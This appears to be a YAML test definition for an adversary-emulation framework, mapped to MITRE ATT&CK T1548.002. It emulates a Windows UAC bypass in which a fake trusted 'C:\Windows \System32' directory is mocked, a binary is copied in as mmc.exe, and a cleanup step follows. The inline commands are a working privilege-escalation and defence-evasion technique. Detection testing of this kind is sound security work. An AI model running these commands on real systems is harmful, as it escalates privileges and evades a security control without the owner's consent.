api_version: "2.0"
name: Bypass UAC by Mocking Trusted Directories
description: |
    Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
    Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch
args:
    - name: executable_binary
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: f7a35090-6f7f-4f64-bb47-d657bf5b10c1
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.002: Bypass User Account Control'
requirements:
    platforms:
        - os: windows
steps:
    - name: bypass-uac-by-mocking-trusted-directories
      inline: |
        mkdir "\\?\C:\Windows \System32\"
        copy "{{.Args.executable_binary}}" "\\?\C:\Windows \System32\mmc.exe"
        mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
      executor: command_prompt
      cleanup:
        inline: |
            rd "\\?\C:\Windows \" /S /Q >nul 2>nul
            del "c:\testbypass.exe" >nul 2>nul
        executor: command_prompt
